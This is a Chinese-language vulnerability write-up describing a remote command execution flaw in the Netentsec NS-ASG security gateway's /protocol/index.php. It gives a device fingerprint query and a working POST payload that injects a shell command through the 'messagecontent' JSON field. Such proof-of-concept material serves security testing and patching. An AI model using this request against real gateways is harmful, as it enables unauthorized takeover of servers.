# 网康 NS-ASG安全网关 index.php 远程命令执行漏洞

## 漏洞描述

网康 NS-ASG安全网关 index.php文件存在远程命令执行漏洞，攻击者通过构造特殊的请求包可以获取服务器权限

## 漏洞影响

```
网康 NS-ASG安全网关
```

## 网络测绘

```
title=="网康 NS-ASG 应用安全网关"
```

## 漏洞复现

登录页面

![image-20230314085700163](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326134623398.png)

存在漏洞的文件为 /protocol/index.php ，通过文件读取可以获取到源码

![image-20230314085713446](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326134623399.png)

![image-20230314085722233](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326134623400.png)

通过构造请求包进行命令拼接漏洞执行命令

```
POST /protocol/index.php
  
jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>1.txt;"}
```

![image-20230314085737042](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326134623401.png)

![image-20230314085745134](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326134623402.png)